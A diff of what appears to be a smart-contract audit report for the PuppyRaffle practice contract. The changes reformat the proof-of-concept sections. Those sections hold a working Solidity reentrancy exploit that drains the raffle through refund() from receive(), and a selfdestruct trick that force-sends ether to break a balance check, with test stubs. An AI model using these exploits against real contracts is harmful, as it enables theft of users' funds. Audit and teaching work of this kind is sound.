@@ -20,47 +20,48 @@ This detailed breakdown of vulnerabilities allows a better assessment of the con
 ### POC
 
 **Contract**
-// SPDX-License-Identifier: SEE LICENSE IN LICENSE
-pragma solidity 0.7.6;
-import "../src/PuppyRaffle.sol";
 
-contract AttackRaffle {
-PuppyRaffle immutable puppyraffle;
+    // SPDX-License-Identifier: SEE LICENSE IN LICENSE
+    pragma solidity 0.7.6;
+    import "../src/PuppyRaffle.sol";
 
-    address public immutable owner;
-    uint256 myIndex;
+    contract AttackRaffle {
+    PuppyRaffle immutable puppyraffle;
 
-    constructor(address _contractAddress) {
-        owner = payable(msg.sender);
-        puppyraffle = PuppyRaffle(_contractAddress);
-    }
+        address public immutable owner;
+        uint256 myIndex;
 
-    function destroy(address _puppyContract) external {
-        selfdestruct(payable(_puppyContract));
-    }
+        constructor(address _contractAddress) {
+            owner = payable(msg.sender);
+            puppyraffle = PuppyRaffle(_contractAddress);
+        }
 
-    function playGame(uint256 entranceFee) external payable {
-        // start by playing the game.
-        address[] memory players = new address[](1);
-        players[0] = address(this);
-        puppyraffle.enterRaffle{value: entranceFee}(players);
+        function destroy(address _puppyContract) external {
+            selfdestruct(payable(_puppyContract));
+        }
 
-        // then the main attack which is the refund function.
-        myIndex = puppyraffle.getActivePlayerIndex(address(this));
-        puppyraffle.refund(myIndex);
-    }
+        function playGame(uint256 entranceFee) external payable {
+            // start by playing the game.
+            address[] memory players = new address[](1);
+            players[0] = address(this);
+            puppyraffle.enterRaffle{value: entranceFee}(players);
 
-    receive() external payable {
-        if (address(puppyraffle).balance > 0) {
+            // then the main attack which is the refund function.
             myIndex = puppyraffle.getActivePlayerIndex(address(this));
             puppyraffle.refund(myIndex);
-        } else {
-            (bool success, ) = (owner).call{value: address(this).balance}("");
-            if (!success) revert("Failed Transaction");
+        }
+
+        receive() external payable {
+            if (address(puppyraffle).balance > 0) {
+                myIndex = puppyraffle.getActivePlayerIndex(address(this));
+                puppyraffle.refund(myIndex);
+            } else {
+                (bool success, ) = (owner).call{value: address(this).balance}("");
+                if (!success) revert("Failed Transaction");
+            }
         }
     }
 
-}
 **Test**
 
     function test_reenterancy_attack() external {
@@ -99,14 +100,18 @@ PuppyRaffle immutable puppyraffle;
 ### POC
 
 **Contract**
-function destroy(address \_puppyContract) external {
-selfdestruct(payable(\_puppyContract));
-}
+
+        function destroy(address \_puppyContract) external {
+            selfdestruct(payable(\_puppyContract));
+        }
+
 This is a snippet from the above contract AttactPuppyRaffle.
+
 **Test**
-function test_withdraw_attack() external {
-// function that select winner
-testSelectWinner();
+
+    function test_withdraw_attack() external {
+        // function that select winner
+        testSelectWinner();
 
         // The attack
         attackRaffle = new AttackRaffle(address(puppyRaffle));
